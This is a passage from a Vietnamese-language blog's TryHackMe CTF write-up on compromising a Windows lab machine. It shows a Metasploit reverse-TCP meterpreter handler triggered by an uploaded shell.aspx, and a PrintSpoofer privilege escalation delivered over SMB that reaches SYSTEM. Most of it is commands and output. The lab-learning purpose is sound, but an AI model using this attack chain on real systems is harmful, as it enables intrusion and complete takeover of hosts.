+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=&gt;</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter_reverse_tcp</span></span></span></code></pre></div></div>
+<p>Thiết lập LHOSTS và LPORT giống với trong payload vừa tạo</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">10.18.3.74</span><span class="p">:</span><span class="mi">2402</span> </span></span></code></pre></div></div>
+<p>Sau đó tạo request đến web để mở file shell vừa up lên server. Tôi có 2 port tcp ở đây là 80 và 49663, sau khi thử cả 2 thì tôi có <code>curl http://10.10.189.211:49663/nt4wrksv/shell.aspx</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getuid</span>
+</span></span><span class="line"><span class="cl"><span class="n">Server</span> <span class="n">username</span><span class="p">:</span> <span class="n">IIS</span> <span class="n">APPPOOL</span>\<span class="n">DefaultAppPool</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="mi">2116</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="mi">1</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.14393</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2016</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">system32</span>\<span class="n">inetsrv</span><span class="o">&gt;</span></span></span></code></pre></div></div>
+<p>Và tôi tìm được <em>user flag</em> trong user Bob</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">c</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">dir</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="ow">is</span> <span class="n">AC3C</span><span class="o">-</span><span class="mi">5</span><span class="n">CB5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">c</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">04</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">02</span><span class="p">:</span><span class="mi">04</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">24</span> <span class="n">AM</span>                <span class="mi">35</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="mi">35</span> <span class="nb">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">20</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">997</span><span class="p">,</span><span class="mi">952</span> <span class="nb">bytes</span> <span class="n">free</span></span></span></code></pre></div></div>
+
+<h2 class="relative group">Privilege escalation
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Tôi check thử xem có các đặc quyền nào không</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getprivs</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Enabled</span> <span class="n">Process</span> <span class="n">Privileges</span>
+</span></span><span class="line"><span class="cl"><span class="o">==========================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeAssignPrimaryTokenPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeAuditPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeCreateGlobalPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeImpersonatePrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseQuotaPrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseWorkingSetPrivilege</span></span></span></code></pre></div></div>
+<p>Tôi để ý có <code>SeImpersonatePrivilege</code>, tôi sẽ dùng <a href="https://github.com/itm4n/PrintSpoofer.git"  target="_blank" rel="noreferrer">payload</a> này để thử lấy quyền SYSTEM.</p>
+<p>Đầu tiên tạo file .exe</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">PrintSpoofer</span><span class="o">/</span><span class="n">PrintSpoofer</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">sudo</span> <span class="n">gcc</span> <span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">cpp</span> <span class="o">-</span><span class="n">o</span> <span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span>    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">neo</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">cpp</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span> <span class="n">fatal</span> <span class="n">error</span><span class="p">:</span> <span class="n">Windows</span><span class="o">.</span><span class="n">h</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">3</span> <span class="o">|</span> <span class="c1">#include &lt;Windows.h&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">|</span>          <span class="o">^~~~~~~~~~~</span>
+</span></span><span class="line"><span class="cl"><span class="n">compilation</span> <span class="n">terminated</span><span class="o">.</span></span></span></code></pre></div></div>
+<p>Có vẻ như không chạy được bằng terminal, tôi phải tải vscode về để build file này. Nhưng tôi nhận ra để build được thì tôi lại phải tải Vs Studio và cài thêm C++, chỉ từng ấy thứ đã làm tôi muốn từ bỏ rồi. &#x1f62a;</p>
+<p>May mắn là đã có người làm thay tôi việc đó up nó lên github, và nó ở <a href="https://github.com/dievus/printspoofer.git"  target="_blank" rel="noreferrer">đây</a>. Bây giờ thì chỉ cần clone nó về và đẩy nó vào máy mục tiêu.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">neo</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">printspoofer</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">smbclient</span> \\\\<span class="mf">10.10.114.141</span>\\<span class="n">nt4wrksv</span>        
+</span></span><span class="line"><span class="cl"><span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">neo</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Try</span> <span class="s2">&#34;help&#34;</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">put</span> <span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span> 
+</span></span><span class="line"><span class="cl"><span class="n">putting</span> <span class="n">file</span> <span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span> <span class="k">as</span> \<span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span> <span class="p">(</span><span class="mf">29.4</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">29.4</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="nb">dir</span>
+</span></span><span class="line"><span class="cl">  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Wed</span> <span class="n">Aug</span> <span class="mi">10</span> <span class="mi">00</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">19</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Wed</span> <span class="n">Aug</span> <span class="mi">10</span> <span class="mi">00</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">19</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">  <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span>                       <span class="n">A</span>       <span class="mi">98</span>  <span class="n">Sat</span> <span class="n">Jul</span> <span class="mi">25</span> <span class="mi">11</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">33</span> <span class="mi">2020</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span>                    <span class="n">A</span>    <span class="mi">27136</span>  <span class="n">Wed</span> <span class="n">Aug</span> <span class="mi">10</span> <span class="mi">00</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">19</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shell</span><span class="o">.</span><span class="n">aspx</span>                          <span class="n">A</span>  <span class="mi">1013006</span>  <span class="n">Tue</span> <span class="n">Aug</span>  <span class="mi">9</span> <span class="mi">22</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span> <span class="mi">2022</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="mi">7735807</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">5158914</span> <span class="n">blocks</span> <span class="n">available</span></span></span></code></pre></div></div>
+<p>Chạy lại meterpreter payload và thực hiện lại lệnh <code>curl</code>, sau đó tìm xem file exe vừa đẩy lên ở đâu.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">c</span><span class="p">:</span>\<span class="o">&gt;</span><span class="nb">dir</span> <span class="s2">&#34;\PrintSpoofer.exe&#34;</span> <span class="o">/</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir</span> <span class="s2">&#34;\PrintSpoofer.exe&#34;</span> <span class="o">/</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="ow">is</span> <span class="n">AC3C</span><span class="o">-</span><span class="mi">5</span><span class="n">CB5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">c</span><span class="p">:</span>\<span class="n">inetpub</span>\<span class="n">wwwroot</span>\<span class="n">nt4wrksv</span></span></span></code></pre></div></div>
+<p>Bây giờ thì lấy quyền admin thôi.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">c</span><span class="p">:</span>\<span class="n">inetpub</span>\<span class="n">wwwroot</span>\<span class="n">nt4wrksv</span><span class="o">&gt;</span><span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">c</span> <span class="n">cmd</span>
+</span></span><span class="line"><span class="cl"><span class="n">PrintSpoofer</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">c</span> <span class="n">cmd</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">privilege</span><span class="p">:</span> <span class="n">SeImpersonatePrivilege</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Named</span> <span class="n">pipe</span> <span class="n">listening</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">CreateProcessAsUser</span><span class="p">()</span> <span class="n">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.14393</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2016</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> \<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">desktop</span>
+</span></span><span class="line"><span class="cl"><span class="n">cd</span> \<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">dir</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="ow">is</span> <span class="n">AC3C</span><span class="o">-</span><span class="mi">5</span><span class="n">CB5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">24</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">24</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">AM</span>                <span class="mi">35</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="mi">35</span> <span class="nb">bytes</span>
+</span></span><span class="line"><span class="cl">               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">21</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">473</span><span class="p">,</span><span class="mi">472</span> <span class="nb">bytes</span> <span class="n">free</span></span></span></code></pre></div></div>
+
+<h2 class="relative group">Conclusion
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Tôi chưa có nhiều kiến thức về window nên thử thách này thực sự đã làm khó tôi đặc biệt là phần leo thang đặc quyền. Tôi sẽ phải học thêm và sẽ làm thêm các CTF của Windows.</p>
+<p>Đọc thêm: <a href="https://www.exploit-db.com/docs/48760"  target="_blank" rel="noreferrer">SMB Enumeration &amp; Exploitation &amp; Hardening</a></p>
+<p>Đọc thêm: <a href="https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj"  target="_blank" rel="noreferrer">Window Privilege Escalation</a></p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/tryhackme/gamingserver/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Tryhackme - GamingServer
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2021-11-17T00:00:00&#43;00:00">17 November 2021</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          TAH
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
